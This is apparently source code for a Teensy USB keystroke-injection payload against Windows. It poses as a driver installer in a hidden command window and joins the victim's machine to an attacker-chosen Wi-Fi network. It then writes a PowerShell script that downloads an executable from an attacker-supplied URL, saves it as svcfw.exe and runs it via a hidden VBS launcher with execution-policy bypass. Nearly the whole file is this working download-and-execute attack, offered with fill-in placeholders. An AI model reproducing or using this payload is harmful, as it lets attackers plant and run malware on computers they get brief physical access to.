#define BOARDTYPE
#ifdef TEENSY2
    #include<usb_private.h>
#endif



void setup(){
  
  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd(3,500,"cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers\""))
  {
  reset_windows_desktop(2000);
  }

  Keyboard.println("echo ^<?xml version=\"1.0\"?^> > %TEMP%\\pl.xml ");
  Keyboard.println("echo ^<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\"^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^<name^>INPUT0^</name^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^<SSIDConfig^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^<SSID^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^<hex^>INPUT1^</hex^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^<name^>INPUT0^</name^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^</SSID^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^</SSIDConfig^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^<connectionType^>ESS^</connectionType^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^<connectionMode^>auto^</connectionMode^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^<MSM^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^<security^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^<authEncryption^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^<authentication^>WPA2PSK^</authentication^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^<encryption^>AES^</encryption^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^<useOneX^>false^</useOneX^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^</authEncryption^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^<sharedKey^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^<keyType^>passPhrase^</keyType^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^<protected^>false^</protected^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^<keyMaterial^>INPUT2^</keyMaterial^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^</sharedKey^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^</security^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^</MSM^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^</WLANProfile^> >> %TEMP%\\pl.xml ");
  Keyboard.println("netsh wlan add profile filename=%TEMP%\\pl.xml ");
  delay(2000);
  Keyboard.println("netsh wlan connect name=INPUT0 ");
  delay(3000);
  Keyboard.println("echo $wc = New-Object System.Net.WebClient > %temp%\\dl.ps1");
  Keyboard.println("echo $url = \"INPUT3\" >> %temp%\\dl.ps1");
  Keyboard.println("echo [string]$hex = $wc.dlString($url) >> %temp%\\dl.ps1");
  Keyboard.println("echo [Byte[]] $temp = $hex -split ' ' >> %temp%\\dl.ps1");
  Keyboard.println("echo [System.IO.File]::WriteAllBytes(\"%TEMP%\\svcfw.exe\", $temp) >> %temp%\\dl.ps1");
  Keyboard.println("echo start-process -nonewwindow \"%TEMP%\\svcfw.exe\" >> %temp%\\dl.ps1");
   
  delay(2000);
  
  Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\dl.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\dl.ps1\"),0,true >> %temp%\\dl.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\dl.vbs");
  delay(3000);
  
  Keyboard.println("exit");

  

}

void loop(){
}

DEFS




